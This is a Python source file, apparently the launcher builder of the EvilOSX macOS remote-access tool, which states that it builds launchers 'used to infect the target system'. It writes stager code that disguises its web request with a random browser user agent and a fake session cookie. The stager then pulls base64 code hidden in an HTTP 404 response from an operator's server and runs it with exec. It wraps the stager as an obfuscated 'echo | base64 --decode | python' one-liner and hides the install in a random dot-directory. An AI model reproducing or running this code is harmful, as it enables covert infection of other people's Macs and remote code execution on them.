#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Builds launchers which are used to infect the target system."""
__author__ = "Marten4n6"
__license__ = "GPLv3"

import json
import random
import string
from base64 import b64encode
from os import path, mkdir
from sys import exit
from textwrap import dedent
from uuid import uuid4

from bot import launchers, loaders
from server.modules.helper import DATA_DIRECTORY

MESSAGE_INPUT = "[\033[1m?\033[0m] "
MESSAGE_INFO = "[\033[94mI\033[0m] "
MESSAGE_ATTENTION = "[\033[91m!\033[0m] "


def _get_random_user_agent() -> str:
    """:return: A random user agent."""
    # Taken from https://techblog.willshouse.com/2012/01/03/most-common-user-agents/
    user_agents = [
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0.3 Safari/604.5.6",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
    ]
    return random.choice(user_agents)


def _get_random_string(size: int = random.randint(6, 15), numbers: bool = False) -> str:
    """:return: A randomly generated string of x characters."""
    result = ""

    for i in range(0, size):
        if not numbers:
            result += random.choice(string.ascii_letters)
        else:
            result += random.choice(string.ascii_letters + string.digits)
    return result


def create_stager(server_host: str, server_port: int, loader_options: dict) -> str:
    """:return: The stager which the launcher will execute."""
    stager_host = "http://{}:{}".format(server_host, server_port)

    # Small piece of code which starts the staging process.
    # (Runs the loader returned by the server).
    stager_code = dedent("""\
    # -*- coding: utf-8 -*-
    import urllib2
    from base64 import b64encode, b64decode
    import getpass
    from uuid import getnode
    from binascii import hexlify

    
    def get_uid():
        return hexlify(getpass.getuser() + "-" + str(getnode()))

    
    {0} = "{1}"
    data = {{
        "Cookie": "session=" + b64encode(get_uid()) + "-{2}",
        "User-Agent": "{3}"
    }}
        
    try:
        request = urllib2.Request("{4}", headers=data)
        urllib2.urlopen(request).read()
    except urllib2.HTTPError as ex:
        if ex.code == 404:
            exec(b64decode(ex.read().split("DEBUG:\\n")[1].replace("DEBUG-->", "")))
        else:
            raise
    """.format(
        _get_random_string(), _get_random_string(numbers=True),
        b64encode("{}".format(json.dumps({
            "type": 0,
            "payload_options": {"host": server_host, "port": server_port},
            "loader_options": loader_options
        })).encode()).decode(),
        _get_random_user_agent(),
        stager_host
    ))

    return "echo {} | base64 --decode | python".format(b64encode(stager_code.encode()).decode())


def setup():
    """Creates the required directories used by the server."""
    directories = [
        DATA_DIRECTORY,
        path.join(DATA_DIRECTORY, "builds"),
        path.join(DATA_DIRECTORY, "output")
    ]

    for directory in directories:
        if not path.exists(directory):
            mkdir(directory)


def main():
    setup()

    server_host = input(MESSAGE_INPUT + "Server host (where EvilOSX will connect to): ")
    server_port = int(input(MESSAGE_INPUT + "Server port: "))
    program_directory = input(MESSAGE_INPUT + "Where should EvilOSX live? [ENTER for ~/Library/Containers/.<RANDOM>]: ")

    if not program_directory:
        random_directory = "~/Library/Containers/.{}".format(_get_random_string())

        program_directory = random_directory
        print(MESSAGE_INFO + "Using: {}".format(random_directory))

    # Select a launcher
    launcher_names = launchers.get_names()

    print(MESSAGE_INFO + "{} available launchers: ".format(len(launcher_names)))
    for i, launcher_name in enumerate(launcher_names):
        print("{} = {}".format(str(i), launcher_name))

    while True:
        try:
            selected_launcher = input(MESSAGE_INPUT + "Launcher to use [ENTER for 1]: ")

            if not selected_launcher:
                selected_launcher = 1
            else:
                selected_launcher = int(selected_launcher)

            selected_launcher = launcher_names[selected_launcher]
            break
        except (ValueError, IndexError):
            continue

    # Select a loader
    loader_names = loaders.get_names()

    print(MESSAGE_INFO + "{} available loaders: ".format(len(loader_names)))
    for i, loader_name in enumerate(loader_names):
        print("{} = {} ({})".format(str(i), loader_name, loaders.get_info(loader_name)["Description"]))

    while True:
        try:
            selected_loader = input(MESSAGE_INPUT + "Loader to use [ENTER for 0]: ")

            if not selected_loader:
                selected_loader = 0
            else:
                selected_loader = int(selected_loader)

            selected_loader = loader_names[selected_loader]
            break
        except (ValueError, IndexError):
            continue

    # Loader setup
    loader_options = loaders.get_options(selected_loader)
    loader_options["program_directory"] = program_directory

    # Create the launcher
    print(MESSAGE_INFO + "Creating the \"{}\" launcher...".format(selected_launcher))
    stager = create_stager(server_host, server_port, loader_options)

    launcher_extension, launcher = launchers.generate(selected_launcher, stager)
    launcher_path = path.realpath(path.join(path.dirname(__file__), "data", "builds", "Launcher-{}.{}".format(
        str(uuid4())[:6], launcher_extension
    )))

    with open(launcher_path, "w") as output_file:
        output_file.write(launcher)

    print(MESSAGE_INFO + "Launcher written to: {}".format(launcher_path))


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n" + MESSAGE_ATTENTION + "Interrupted.")
        exit(0)
